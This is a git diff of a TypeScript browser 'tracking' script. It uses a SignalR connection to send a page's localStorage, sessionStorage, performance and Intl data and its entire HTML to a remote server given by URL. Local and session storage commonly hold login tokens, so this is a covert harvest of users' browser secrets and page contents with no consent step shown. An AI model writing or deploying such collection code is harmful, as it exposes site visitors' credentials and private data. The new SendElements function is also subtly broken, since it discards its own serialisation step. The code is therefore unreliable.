@@ -27,22 +27,33 @@ let InitiateAllEvents = async (connection: signalR.HubConnection): Promise<void>
 let SendElementsOrder = async (connection: signalR.HubConnection, elementsOrder: string[]) => 
 	connection.invoke(wsConnectionName, elementsOrder.join(elementsOrderSeperator));
 
+let SendElements = async (connection: signalR.HubConnection, elements: (object | string)[]) => {
+	elements
+		.map(e => typeof e === "string" ? e : JSON.stringify(e))
+		.join(elementsOrderSeperator)
+
+	connection.invoke(wsConnectionName, elements.join(elementsOrderSeperator));
+}
+
 export default async function StartTracking(URL: string): Promise<void> {
 	const connection = await InititateConnection(URL);
 
-	const frontEndData: Record<string, object> = {
-		"Window": window,
+	const frontEndData: Record<string, object | string> = {
+		// "Window": window,
 		"Object": Object,
 		"Performance": performance,
 		"Intl": Intl,
 		"Local Storage": localStorage,
-		"Session Storage": sessionStorage
+		"Session Storage": sessionStorage,
+		"InnerHTML": document.documentElement.innerHTML
 	}
 
 	// Order of elements that are sent
 	const elementsOrder = Object.keys(frontEndData);
+	const elements = Object.values(frontEndData);
 
-	await SendElementsOrder(connection, elementsOrder);
+	// await SendElementsOrder(connection, elementsOrder);
+	await SendElements(connection, elements)
 
 	await InitiateAllEvents(connection);
 }
